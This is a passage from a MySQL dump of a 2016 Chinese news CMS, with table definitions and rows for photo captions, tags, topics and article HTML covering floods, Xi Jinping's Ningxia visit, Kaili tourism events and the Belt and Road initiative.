跟鲨鱼同游也不怕被发现'),(115,0,'/u/cms/www/201610/10131516fhw7.jpg','四川石渠发现至少30万公顷珍贵泥炭湿地资源'),(115,1,'/u/cms/www/201610/101315235s7b.jpg','四川石渠发现至少30万公顷珍贵泥炭湿地资源'),(115,2,'/u/cms/www/201610/101315314qdt.jpg','四川石渠发现至少30万公顷珍贵泥炭湿地资源'),(116,0,'/u/cms/www/201610/10131759kpti.jpg','/u/cms/www/201610/10131742wzhv.jpg'),(116,1,'/u/cms/www/201610/10131811udfh.jpg','/u/cms/www/201610/10131742wzhv.jpg'),(117,0,'/u/cms/www/201610/1013205987uh.jpg','中俄“合作－2016”联合反恐训练圆满结束'),(117,1,'/u/cms/www/201610/10132108kvcd.jpg','中俄“合作－2016”联合反恐训练圆满结束'),(117,2,'/u/cms/www/201610/10132117q0se.jpg','中俄“合作－2016”联合反恐训练圆满结束'),(117,3,'/u/cms/www/201610/10132128e9mz.jpg','中俄“合作－2016”联合反恐训练圆满结束'),(117,4,'/u/cms/www/201610/101321427ybi.jpg','中俄“合作－2016”联合反恐训练圆满结束'),(118,0,'/u/cms/www/201610/10132256evzu.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤'),(118,1,'/u/cms/www/201610/10132301wue2.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤'),(118,2,'/u/cms/www/201610/101323052xt2.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤'),(118,3,'/u/cms/www/201610/10132310d08y.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤'),(118,4,'/u/cms/www/201610/10132315avlw.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤'),(118,5,'/u/cms/www/201610/10132322exj1.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤'),(118,6,'/u/cms/www/201610/10132327lk40.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤'),(118,7,'/u/cms/www/201610/10132336658k.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤'),(118,8,'/u/cms/www/201610/10132342mxeq.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤'),(118,9,'/u/cms/www/201610/10132347qr6a.jpg','探访燕城监狱：蔬菜自己种 午餐两菜一汤'),(119,0,'/u/cms/www/201610/101326217xkx.jpg','摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕'),(119,1,'/u/cms/www/201610/10132629r00n.jpg','摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕'),(119,2,'/u/cms/www/201610/10132635f63e.jpg','摄影师拍摄巨鳄破水而出吞食猎物 上演一箭双雕'),(120,0,'/u/cms/www/201610/10133454sydj.jpg','宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空'),(120,1,'/u/cms/www/201610/10133506taqx.jpg','宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空'),(120,2,'/u/cms/www/201610/10133511s7r1.jpg','宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空'),(120,3,'/u/cms/www/201610/101335147ye6.jpg','宛如置身黑客帝国 “啤酒丛林”惊艳青岛海滨夜空'),(141,0,'/u/cms/www/201610/11094215kqsv.jpg','乌兰布统牧歌秋韵'),(141,1,'/u/cms/www/201610/11094229szn0.jpg','乌兰布统牧歌秋韵'),(141,2,'/u/cms/www/201610/11094234lj78.jpg','乌兰布统牧歌秋韵'),(141,3,'/u/cms/www/201610/11094239ard1.jpg','乌兰布统牧歌秋韵'),(141,4,'/u/cms/www/201610/11094243v534.jpg','乌兰布统牧歌秋韵'),(141,5,'/u/cms/www/201610/11094246016h.jpg','乌兰布统牧歌秋韵'),(141,6,'/u/cms/www/201610/11094250fq4t.jpg','乌兰布统牧歌秋韵'),(141,7,'/u/cms/www/201610/11094254usxs.jpg','乌兰布统牧歌秋韵'),(141,8,'/u/cms/www/201610/11094257nm5d.jpg','乌兰布统牧歌秋韵'),(141,9,'/u/cms/www/201610/11094309iwnb.jpg','乌兰布统牧歌秋韵'),(141,10,'/u/cms/www/201610/11094419duy6.jpg','乌兰布统牧歌秋韵');
/*!40000 ALTER TABLE `jc_content_picture` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_record`
--

DROP TABLE IF EXISTS `jc_content_record`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_record` (
  `content_record_id` bigint(20) NOT NULL AUTO_INCREMENT,
  `content_id` int(11) NOT NULL DEFAULT '0' COMMENT '文章ID',
  `user_id` int(11) NOT NULL DEFAULT '0' COMMENT '操作人',
  `operate_time` datetime NOT NULL COMMENT '操作时间',
  `operate_type` tinyint(2) NOT NULL DEFAULT '0' COMMENT '0 新增 1修改 2审核 3退回 4移动 5生成静态页 6删除到回收站 7归档 8出档 9推送共享',
  PRIMARY KEY (`content_record_id`),
  KEY `fk_index_jc_content_record_content` (`content_id`),
  KEY `fk_index_jc_content_record_user` (`user_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='文章操作记录';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_record`
--

LOCK TABLES `jc_content_record` WRITE;
/*!40000 ALTER TABLE `jc_content_record` DISABLE KEYS */;
INSERT INTO `jc_content_record` VALUES (1,130,1,'2016-10-11 17:29:39',1);
/*!40000 ALTER TABLE `jc_content_record` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_tag`
--

DROP TABLE IF EXISTS `jc_content_tag`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_tag` (
  `tag_id` int(11) NOT NULL AUTO_INCREMENT,
  `tag_name` varchar(50) NOT NULL COMMENT 'tag名称',
  `ref_counter` int(11) NOT NULL DEFAULT '1' COMMENT '被引用的次数',
  PRIMARY KEY (`tag_id`),
  UNIQUE KEY `ak_tag_name` (`tag_name`)
) ENGINE=InnoDB AUTO_INCREMENT=716 DEFAULT CHARSET=utf8 COMMENT='CMS内容TAG表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_tag`
--

LOCK TABLES `jc_content_tag` WRITE;
/*!40000 ALTER TABLE `jc_content_tag` DISABLE KEYS */;
INSERT INTO `jc_content_tag` VALUES (3,'2016',2),(8,'法国',2),(9,'尼斯',2),(10,'发生',2),(11,'汽车',1),(12,'冲撞',1),(13,'事故',1),(14,'已',1),(15,'致',2),(16,'75人',1),(17,'死',1),(18,'上百人',1),(19,'伤',1),(21,'拍摄',2),(24,'破',2),(42,'四川',2),(59,'之',2),(61,'震撼',1),(62,'视角',1),(63,'年度',1),(64,'无人机',1),(65,'摄影',1),(66,'大赛',1),(67,'佳作',1),(68,'大赏',1),(71,'南海',1),(102,'习近平',3),(103,'恐',1),(104,'袭',1),(105,'事件',1),(107,'向',1),(108,'法',1),(109,'总统',1),(110,'慰问电',1),(111,'中国空军',1),(112,'航空兵',1),(113,'赴',1),(114,'常态',1),(115,'化',1),(116,'战斗',1),(117,'巡航',1),(118,'宁夏',1),(119,'考察',1),(120,'第一天',1),(121,'长征',1),(122,'永',1),(123,'远在',1),(124,'路上',1),(139,'十一',1),(140,'黄金周',1),(141,'凯里',1),(142,'地区',1),(143,'文化',1),(144,'旅游活动',1),(145,'精彩纷呈',1),(149,'一带',1),(150,'一路',1),(151,'打开',1),(152,'筑',1),(153,'梦',1),(154,'空间',1),(155,'加拿大',2),(156,'同意',1),(157,'中国',1),(158,'协商',1),(159,'引渡',1),(160,'条约',1),(161,'转变',1),(162,'抵制',1),(163,'态度',1),(164,'深圳',1),(165,'二手房',1),(166,'卖主',1),(167,'悔',1),(168,'约',1),(169,'不服',1),(170,'判决',1),(171,'纠集',1),(172,'60',1),(173,'余人',1),(174,'冲击',1),(175,'法院',1),(176,'不实',1),(177,'名',1),(178,'手机号',1),(179,'停机',1),(180,'在即',1),(181,'移动',1),(182,'不对',1),(183,'任何',1),(184,'社会',1),(185,'渠道',1),(186,'授权',1),(187,'网络',1),(188,'售',1),(189,'卡',1),(199,'亚马逊',1),(200,'股价',1),(201,'首',1),(202,'800',1),(203,'美元',1),(204,'大关',1),(205,'市值',1),(206,'稳',1),(207,'居',1),(208,'全球',1),(209,'上市公司',1),(210,'第四',1),(212,'百度',2),(230,'海',1),(231,'银',1),(232,'系',1),(233,'接',1),(234,'盘',1),(235,'匹',2),(236,'凸',1),(237,'谜',1),(238,'局',1),(239,'待',1),(240,'解',1),(241,'p2p',1),(242,'业务',1),(243,'惨淡',1),(244,'收场',1),(245,'多次',1),(246,'调查',1),(247,'苹果',1),(248,'研发',1),(249,'神秘',1),(250,'新',1),(251,'设备',1),(252,'体积',1),(253,'类似',1),(254,'apple',1),(255,'tv',1),(256,'支持',1),(257,'nfc',1),(258,'蓝牙',1),(269,'一',2),(271,'理塘县',1),(272,'4.9级',1),(273,'地震',1),(274,'震源',1),(275,'深度',1),(276,'19千米',1),(286,'web',1),(287,'前端',1),(288,'开发人员',1),(289,'asp.net',1),(290,'开发',1),(291,'工程师',1),(292,'文案',1),(293,'编辑',1),(298,'双休',6),(322,'北京',2),(323,'天安门广场',1),(324,'祝福',1),(325,'祖国',1),(326,'大',1),(327,'花篮',1),(328,'吊装',1),(329,'完毕',1),(340,'墨西哥',1),(341,'油轮',1),(342,'失火',1),(345,'南瓜',2),(351,'本',1),(352,'网',1),(353,'记者',1),(354,'体验',1),(355,'360行',1),(356,'183',1),(357,'另类',1),(358,'复制',1),(365,'旅',1),(366,'比大',1),(367,'熊猫',1),(368,'宝宝',1),(369,'取名',1),(370,'天宝',1),(375,'莫斯科',1),(376,'举办',1),(377,'国际',1),(378,'灯光',1),(379,'节',1),(388,'宇航员',1),(389,'地球',1),(390,'夜景',1),(391,'灯火',1),(392,'辉煌灿烂',1),(393,'海水',1),(394,'平滑',1),(395,'如',1),(396,'镜',1),(398,'妖',2),(399,'倾城',2),(414,'诗',2),(435,'高性能',1),(436,'年终奖',5),(437,'五险一金',5),(438,'带薪年假',5),(439,'节日福利',4),(500,'专访',1),(501,'科学家',2),(502,'徐',1),(503,'伟',1),(504,'谷歌',1),(505,'人工智能',1),(506,'平台',1),(507,'更易',1),(508,'上手',1),(509,'电信',1),(510,'诈骗',1),(511,'多发',1),(512,'产生',1),(513,'蝴蝶效应',1),(514,'虚拟',1),(515,'运营商',1),(516,'融资',1),(517,'受',1),(518,'波及',1),(519,'李克强',2),(520,'联合国',1),(521,'承诺',1),(522,'援助',1),(523,'难民',1),(524,'这是',1),(525,'责任',1),(526,'道义',1),(527,'担当',1),(528,'研制',1),(529,'隐身',1),(530,'潜水',1),(531,'服',1),(532,'跟',1),(533,'鲨鱼',1),(534,'同游',1),(535,'也',1),(536,'不怕',1),(537,'发现',2),(538,'石渠',1),(539,'至少',1),(540,'30万公顷',1),(541,'珍贵',1),(542,'泥炭',1),(543,'湿地',1),(544,'资源',1),(545,'全世界',1),(546,'最',2),(547,'孤独',1),(548,'咖啡馆',1),(549,'海拔',1),(550,'4860米',1),(551,'达',1),(552,'古',1),(553,'冰川',1),(554,'巅',1),(555,'中俄',1),(556,'合作',1),(557,'联合',1),(558,'反恐',1),(559,'训练',2),(560,'圆满结束',1),(561,'探访',1),(562,'燕',1),(563,'城',1),(564,'监狱',1),(565,'蔬菜',1),(566,'自己',1),(567,'种',2),(568,'午餐',1),(569,'两',1),(570,'菜',1),(571,'汤',1),(572,'摄影师',1),(573,'巨',1),(574,'鳄',1),(575,'水',1),(576,'而出',1),(577,'吞食',1),(578,'猎物',1),(579,'上演',1),(580,'一箭双雕',1),(581,'宛如',1),(582,'置身',1),(583,'黑客帝国',1),(584,'啤酒',1),(585,'丛林',1),(586,'惊艳',1),(587,'青岛',1),(588,'海滨',1),(589,'夜空',1),(590,'半',1),(591,'爱与恨',1),(592,'追',1),(593,'逃',1),(594,'人',1),(595,'再一次',1),(596,'掀起',1),(597,'一段',1),(598,'惊人',1),(599,'传奇',1),(600,'那年',1),(601,'青春',1),(602,'我们',1),(603,'正好',1),(604,'刘',1),(605,'丹',1),(606,'妮',1),(607,'演绎',1),(608,'闺',1),(609,'蜜',1),(610,'奔',1),(611,'跑吧',1),(612,'兄弟',1),(613,'收',1),(614,'官',1),(615,'对决',1),(616,'一触即发',1),(617,'邓',1),(618,'超',1),(619,'岳',1),(620,'云',1),(621,'鹏',1),(622,'压垮',1),(623,'惨叫',1),(624,'出席',1),(625,'总理',1),(626,'家宴',1),(627,'小小',1),(628,'特',2),(629,'鲁',1),(630,'多',1),(631,'表演',1),(632,'后空翻',1),(633,'习',1),(634,'主席',1),(635,'中央军委',1),(636,'领导',1),(637,'推进',2),(638,'军队',1),(639,'战斗力',1),(640,'建设',1),(641,'纪实',2),(642,'西北',1),(643,'第一村',1),(644,'白',1),(645,'哈',1),(646,'巴',1),(647,'早秋',1),(648,'美国',1),(649,'金秋',1),(650,'不止',1),(651,'红叶',1),(652,'德国',1),(653,'举行',1),(654,'称重',1),(655,'比赛',1),(656,'763公斤',1),(657,'获得',1),(658,'加冕',1),(659,'战',1),(660,'队员',1),(661,'魔鬼',1),(662,'周',1),(663,'挑战',1),(664,'50项',1),(665,'严苛',1),(666,'极限',1),(667,'项目',1),(668,'党中央',1),(669,'民族',1),(670,'工作',1),(671,'创新',1),(672,'发展',1),(673,'楼市',1),(674,'调控',1),(675,'应',1),(676,'跳出',1),(677,'周期性',1),(678,'怪圈',1),(679,'黄金',1),(680,'接连',1),(681,'下跌',1),(682,'难道',1),(683,'大妈',1),(684,'来',1),(685,'托盘',1),(711,'乌兰',1),(712,'布',1),(713,'统',1),(714,'牧歌',1),(715,'秋韵',1);
/*!40000 ALTER TABLE `jc_content_tag` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_topic`
--

DROP TABLE IF EXISTS `jc_content_topic`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_topic` (
  `content_id` int(11) NOT NULL,
  `topic_id` int(11) NOT NULL,
  PRIMARY KEY (`content_id`,`topic_id`),
  KEY `fk_jc_content_topic` (`topic_id`),
  CONSTRAINT `fk_jc_content_topic` FOREIGN KEY (`topic_id`) REFERENCES `jc_topic` (`topic_id`),
  CONSTRAINT `fk_jc_topic_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS专题内容关联表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_topic`
--

LOCK TABLES `jc_content_topic` WRITE;
/*!40000 ALTER TABLE `jc_content_topic` DISABLE KEYS */;
INSERT INTO `jc_content_topic` VALUES (2,1),(7,1),(11,1),(12,1),(13,1),(14,1),(27,1),(28,1),(32,1),(112,1),(113,1),(114,1),(115,1),(116,1),(117,1),(118,1),(119,1),(120,1),(130,1),(131,1),(132,1),(141,1),(2,2),(7,2),(11,2),(12,2),(13,2),(14,2),(27,2),(28,2),(32,2),(112,2),(113,2),(114,2),(115,2),(116,2),(117,2),(118,2),(119,2),(120,2),(131,2),(132,2),(2,3),(7,3),(11,3),(12,3),(13,3),(14,3),(27,3),(28,3),(32,3),(112,3),(113,3),(114,3),(115,3),(116,3),(117,3),(118,3),(119,3),(120,3),(131,3),(132,3);
/*!40000 ALTER TABLE `jc_content_topic` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_content_txt`
--

DROP TABLE IF EXISTS `jc_content_txt`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_content_txt` (
  `content_id` int(11) NOT NULL,
  `txt` longtext COMMENT '文章内容',
  `txt1` longtext COMMENT '扩展内容1',
  `txt2` longtext COMMENT '扩展内容2',
  `txt3` longtext COMMENT '扩展内容3',
  PRIMARY KEY (`content_id`),
  CONSTRAINT `fk_jc_txt_content` FOREIGN KEY (`content_id`) REFERENCES `jc_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='CMS内容文本表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_content_txt`
--

LOCK TABLES `jc_content_txt` WRITE;
/*!40000 ALTER TABLE `jc_content_txt` DISABLE KEYS */;
INSERT INTO `jc_content_txt` VALUES (11,'<p style=\"text-indent: 2em;\">记者从国家防总、水利部14日召开的新闻发布会上获悉：据初步统计，截至7月13日，长江中下游湖北、湖南、江西、安徽、江苏等5省堤防巡查防守和抢险共投入62.2万人(含部队3.08万人)，6月30日以来已累计投入抗洪抢险777万人次。</p><p><br/></p><p style=\"text-indent: 2em;\">截至7月13日，今年以来全国已有28省(区、市)1508县遭受洪灾，农作物受灾面积5460.66千公顷，受灾人口6074.67万人，因灾死亡237人、失踪93人，倒塌房屋14.72万间，直接经济损失约1469.80亿元。与2000年以来同期均值相比，今年受灾人口、死亡人口、倒塌房屋分别偏少6%、49%、55%，受灾面积、直接经济损失分别偏多26%、213%。</p><p><br/></p><p style=\"text-indent: 2em;\">此外，中央气象台14日继续发布暴雨蓝色预警，未来3天，强降雨将自西向东影响四川盆地、江汉、江淮、江南北部及黄淮南部，上述地区将有大到暴雨，部分地区有大暴雨，局部伴有短时雷雨大风等强对流天气。</p>',NULL,NULL,NULL),(12,'<p style=\"text-indent: 2em;\">央视新闻：【习近平就#法国尼斯袭击事件#向法国总统致慰问电】习近平对这一骇人听闻的野蛮行径表示强烈谴责，向不幸遇难者表示深切的哀悼，向伤者和遇难者家属表示诚挚的慰问。习近平指出，中方坚决反对一切形式的恐怖主义，愿同法方深化反恐合作，共同维护中法两国和世界安全和平。</p>',NULL,NULL,NULL),(14,'<p style=\"text-indent: 2em;\">【习近平考察宁夏首站到固原，冒雨向红军长征会师纪念碑敬献花篮】7月18日，习近平总书记到宁夏回族自治区考察。从北京直飞固原，驱车70多公里到将台堡，向红军长征会师纪念碑敬献花篮并参观三军会师纪念馆。1936年10月，红军三大主力在会宁和将台堡会师，标志二万五千里长征胜利结束。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142227i3ee.jpg\" title=\"16464387039280572236.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/1914230968h5.jpg\" title=\"9093755211529617012.jpg\"/></p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：缅怀先烈、不忘初心，走好新的长征路】参观三军会师纪念馆时，习近平说，红军长征创造了中外历史的奇迹。革命理想高于天，不怕牺牲、排除万难去争取胜利，面对形形色色的敌人决一死战、克敌制胜，这些都是长征精神的内涵。我们要继承和弘扬好伟大的长征精神。有了这样的精神，没有什么克服不了的困难。我们完全有信心有决心有恒心实现中华民族伟大复兴的中国梦。</p><p><br/></p><p style=\"text-indent: 2em;\">习近平说，长征永远在路上。这次专程来这里，就是缅怀先烈、不忘初心，走新的长征路。今天是实现“两个一百年”奋斗目标的新长征。我们这一代人要走好我们这一代人的长征路。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142342h33w.jpg\" title=\"13099311371353179840.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：革命传统教育基地不要贪大求洋】习近平说，革命传统和爱国主义教育基地建设一定不要追求高大全，搞得很洋气、很现代化，花很多钱，那就不是革命传统了，革命传统就变味了。可以通过传统教育带动旅游业，但不能失去红色旅游的底色。只有体会到革命年代的艰苦，才能使人们真正受到教育。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142414bvfg.jpg\" title=\"7973019827669232390.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：我是来看扶贫落实情况的】18日下午，习近平总书记来到泾源县大湾乡杨岭村看望父老乡亲，实地考察精准扶贫情况。总书记察看村容村貌，向当地干部了解村子脱贫情况。走进回族群众马科的家，习近平察看屋内陈设，掀开褥子看炕垒得好不好，问屋顶上铺没铺油毡、会不会漏雨，电视能看多少台。来到厨房，打开灶上的大锅盖，看里面做着什么好吃的。厨房一角有个淋浴的地方，听说安了太阳能热水器，习近平说“挺好”，关心地问家里的小男孩：“你常洗澡吗？”</p><p><br/></p><p style=\"text-indent: 2em;\">墙上张贴着的“建档立卡贫困户精准脱贫信息卡”引起总书记注意。“6口人、劳动力2人，养牛6头，种玉米15亩，牛出栏2头收入7000，劳务输出收入21500，综合收入47000……”习近平逐项察看，一笔一笔算着马科家的收入账。习近平说，信息登记挺细致，关键要抓好落实，我就是来看落实情况的。马科说，我一定努力让今年计划落到口袋里，实现脱贫摘帽的目标。习近平希望马科把孩子教育搞好，学知识、有文化，决不能让他们输在起跑线上。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142446ch8y.jpg\" title=\"2231079109511926610.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：固原的发展脱胎换骨，增强了我们打赢脱贫攻坚战的信心】习近平坐在杨岭村村民马克俊家的炕上，同村干部、党员代表、养牛大户和贫困户代表拉起家常。总书记说，我听你们说说心里话，咱们唠一唠。大家向总书记汇报近几年脱贫攻坚的情况，说党的政策确实确实太好太好了。习近平拉着马克俊的手说，你年纪比我小，是我老弟。看着你和乡亲们的生活越来越好我很高兴。西海固曾经“苦瘠甲天下”。这是我第3次到固原来。我提出再到比较艰苦的农村看一看。通过走访，了解到村里已经解决了饮水问题，住房等生活条件有了明显改善，还开始找到了产业脱贫的路子。全国还有5000万贫困人口，到2020年一定要实现全部脱贫目标。这是我当前最关心的事情。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142513not2.jpg\" title=\"4804757052710294014.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：农村脱贫奔小康，支部很重要】习近平称赞大湾乡杨岭村党支部第一书记兰竹林对村里的情况门儿清，说明工作比较扎实。他说，一个村子建设得好，关键要有一个好党支部。村党支部带领村民脱贫奔小康，只要有规划，有措施，真抓实干，群众拥护，就一定能把工作做好。希望你们把基层党组织和基层政权建设好，团结带领广大群众奔小康。我们还要更上一层楼!</p><p><br/></p><p style=\"text-indent: 2em;\">【总书记为村民算养牛收支账】宁夏固原市大湾乡杨岭村，习近平走进贫困户马克俊家，首先来到小院一角的牛棚。养牛是杨岭村产业脱贫的重要途径，村里的贫困户在政府帮扶下，每家饲养2头安格斯基础母牛、3头育肥牛。习近平询问肉牛出栏育肥、贷款等情况。“过去都是养大黄牛，如今养上了进口牛”，马克俊给总书记详细算起了现在的养牛收支明细账。养牛大户马全龙也来到了小院里，他告诉总书记，自家过去养了5头牛，如今有了10多头，还准备增加到20头。习近平勉励他说：“要发挥好示范带头作用，把好的经验传授给村民。”</p><p><br/></p><p style=\"text-indent: 2em;\">【习近平：防范市场风险，政府要做好信息服务】细雨绵绵，沃野千里。宁夏原州区彭堡镇姚磨村，习近平冒雨视察万亩冷凉蔬菜基地。蔬菜展台前，新鲜采摘的西兰花、紫甘蓝、辣椒、马铃薯等，整齐“列队”。边走边看，习近平问得仔细。“检测标准怎么样？”“一亩地收入多少？”“农活有技术员指导吗？”“喷灌设施一亩地成本多少？”村里的党员干部、种植大户簇拥在总书记身边。习近平和他们聊起土地承包费、务农打工费、入股分红等，询问他们生产中遇到的困难。一位农民说，感觉市场还不大稳定，想更好了解市场需求。习近平表示，防范市场风险，既需要经营个体敏锐把握，也需要政府加强服务，尤其要做好信息服务工作。</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142548un62.jpg\" title=\"2176556949782138032.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p style=\"text-align: center\"><img src=\"/u/cms/www/201607/19142605p9xl.jpg\" title=\"17322238994688503995.jpg\"/></p><p><br/></p><p style=\"text-align: center;\">新华社记者鞠鹏、李涛摄</p><p><br/></p><p><br/></p>',NULL,NULL,NULL),(23,'<p>　　为了贯彻落实贵州省委、省政府关于构建全域旅游、推动旅游“井喷式”增长和黔东南州委、州政府“用好生态文化两个宝贝，打造国内外知名的民族文化旅游目的地”的战略部署，凯里市委、市政府突出建设国际旅游城市、国家园林城市、国家创新型城市的功能定位，以“节庆搭台，旅游唱戏”的超常规举措，着力推动凯里旅游从初级阶段快速向中高级阶段演化。2016年“十一”黄金周推出了文化旅游系列活动。</p><p>　　1、一赛一节</p><p>　　“一赛”即“牛霸天下”2016首届中国•凯里斗牛国际标准赛，“一节”即2016中国•凯里牛崇拜文化艺术节。</p><p>　　活动共分为四个场地：(1)斗牛国际标准赛场：凯里市民族文化活动中心(民族体育场)。(2)牛崇拜文化艺术节第一会场：凯里市民族文化活动中心(民族体育场)场外。(3)牛崇拜文化艺术节第二会场：凯里苗侗风情园。(4)牛崇拜文化艺术节第三会场：凯里民族文化园。举办时间：“牛霸天下”2016首届中国•凯里斗牛国际标准赛10月1日至10月6日，每日下午一点开始。2016中国•凯里牛崇拜文化艺术节10月1日至3日，每天白天和晚上在三个会场均有不同活动。</p><p>　　2、“弘扬民族文化，共筑中国梦”苗族刺绣体验</p><p>　　活动时间：10月1日至10月9日。地点：苗妹非遗博物馆。活动内容：游客现场体验、设计、制作自己心仪的作品。</p><p>　　3、2016“国庆节”南花村约你做客</p><p>　　活动时间：10月1日至10月7日。地点：南花苗寨。活动内容：观原生态山水风光、赏苗族歌舞、学苗族刺绣、饮百年神泉、品苗家米酒、体验传统打糍粑。</p><p>　　4、“李宁红双喜杯”2016中国乒乓球协会会员联赛</p><p>　　活动时间：10月1日至10月7日。地点：凯里学院体育馆。来自全国各地600多名中国乒乓球协会会员参赛，世界乒乓球冠军马琳、国家乒乓球队金牌教练吴敬平亲临凯里为比赛开赛。</p><p>　　5、云谷田园观光康体系列活动</p><p>　　活动时间：10月1日至10月7日。地点：舟溪云谷田园生态农业观光园。活动内容：农业观光采摘和钓鱼比赛等趣味体验活动。</p><p>　　2016“十一”黄金周凯里地区文化旅游系列活动内容丰富，时间长、规模大，亮点多、参与性强，欢迎中外游客和广大市民积极参与体验。</p><p><br/></p>',NULL,NULL,NULL),(27,'<p style=\"text-indent: 2em; text-align: center;\"><img src=\"/u/cms/www/201609/23140225zalw.jpg\" title=\"641-(1).jpg\" alt=\"641-(1).jpg\"/></p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">【学习进行时】在不久前举行的推进“一带一路”建设工作座谈会上，习近平要求：“以钉钉子精神抓下去，一步一步把‘一带一路’建设推向前进，让‘一带一路’建设造福沿线各国人民。”</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">习近平为何如此看重“一带一路”建设？自他发出沿线国家和地区共建“一带一路”倡议三年来，都取得了哪些进展？</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">6月22日，国家主席习近平在塔什干乌兹别克斯坦最高会议立法院发表题为《携手共创丝绸之路新辉煌》的重要演讲。 新华社记者马占成摄</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2013年9月7日，习近平在出访中亚国家期间，首次提出共建“丝绸之路经济带”。同年10月，他又提出共同建设21世纪“海上丝绸之路”，二者共同构成了“一带一路”重大倡议。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">而今，三年了。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\"><strong>“一带一路”这三年</strong></p><p style=\"text-indent: 2em;\"><strong><br/></strong></p><p style=\"text-indent: 2em;\">三年，筚路蓝缕，春华秋实。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在“一带一路”倡议提出的当年11月，十八届三中全会通过的《中共中央关于全面深化改革若干重大问题的决定》明确指出：“加快同周边国家和区域基础设施互联互通建设，推进丝绸之路经济带、海上丝绸之路建设，形成全方位开放新格局。”</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2014年11月的中央财经领导小组第八次会议专门研究了丝绸之路经济带和21世纪海上丝绸之路规划，发起建立亚洲基础设施投资银行和设立丝路基金。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">在博鳌亚洲论坛2015年年会上，习近平呼吁各国积极参与“一带一路”建设。随后，中国政府发布《推动共建丝绸之路经济带和21世纪海上丝绸之路的愿景与行动》，明确了“一带一路”的共建原则、框架思路、合作重点、合作机制等。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2016年3月，国家“十三五”规划纲要正式发布，“推进‘一带一路’建设”成为其中专门一章。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">2016年8月，习近平在推进“一带一路”建设工作座谈会上，进一步提出8项要求。从统一思想到统筹落实，从金融创新到人文合作，从话语体系建设到安全保障，面面俱到。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 2em;\">三年，蓝图由草创到一步步展开、一笔笔绘就。</p><p style=\"text-indent: 2em;\"><br/></p><p style=\"text-indent: 